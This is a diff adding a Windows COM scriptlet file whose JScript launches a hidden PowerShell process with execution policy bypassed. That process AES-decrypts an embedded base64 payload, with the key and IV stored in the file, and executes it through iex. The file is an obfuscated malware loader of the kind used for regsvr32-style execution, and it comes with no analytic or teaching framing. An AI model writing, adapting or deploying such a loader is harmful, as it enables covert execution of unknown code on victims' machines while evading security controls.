@@ -1,0 +1,32 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+    description="AESDecryptionExecution"
+    progid="AESDecryptionExecution"
+    version="1.0"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
+    <script language="JScript">
+        <![CDATA[
+            try {
+                var shell = new ActiveXObject("WScript.Shell");
+
+                var psCommand = "powershell -nop -w hidden -ep bypass -Command \"";
+                psCommand += "$encBytes = [Convert]::FromBase64String('lS2GSReVB1di1Qy3hedOiK0K8SboW/1SkaGvDpjLwiQWgFcfqmMZSEhF3b1ADh7d5/zDpxTgC7kW1IX4YQEZb+7XcPIMxlnh3peDaRx0tmXvL5Gd7E3NBNPbTjtm4whuEGiQi7xRyL1vxXzZURL6JGI10Uuz//2lZQNSnga1A3QERydXHvPxFZe8EbXi1qDEaIxBo0x8V6C0NpZzboeWO157VYfB6ZrdAHKWwKdCUDU=');";
+                psCommand += "$aes = [System.Security.Cryptography.Aes]::Create();";
+                psCommand += "$aes.Key = $([Convert]::FromBase64String('+EyxP4Wc33dKzVJ2JmYzpHR4OxNMxr1kSLiJSePS+Vc='));";
+                psCommand += "$aes.IV = $([Convert]::FromBase64String('LlamKvS3yHme4d9gqP8SoA=='));";
+                psCommand += "$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;";
+                psCommand += "$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;";
+                psCommand += "$decryptor = $aes.CreateDecryptor();";
+                psCommand += "$decBytes = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length);";
+                psCommand += "iex $([System.Text.Encoding]::UTF8.GetString($decBytes))\"";
+
+                shell.Run(psCommand, 0, false);
+            } catch (e) {
+                var shell = new ActiveXObject("WScript.Shell");
+                shell.Popup("Error: " + e.message, 0, "Execution Error", 16);
+            }
+        ]]>
+    </script>
+</registration>
+</scriptlet>
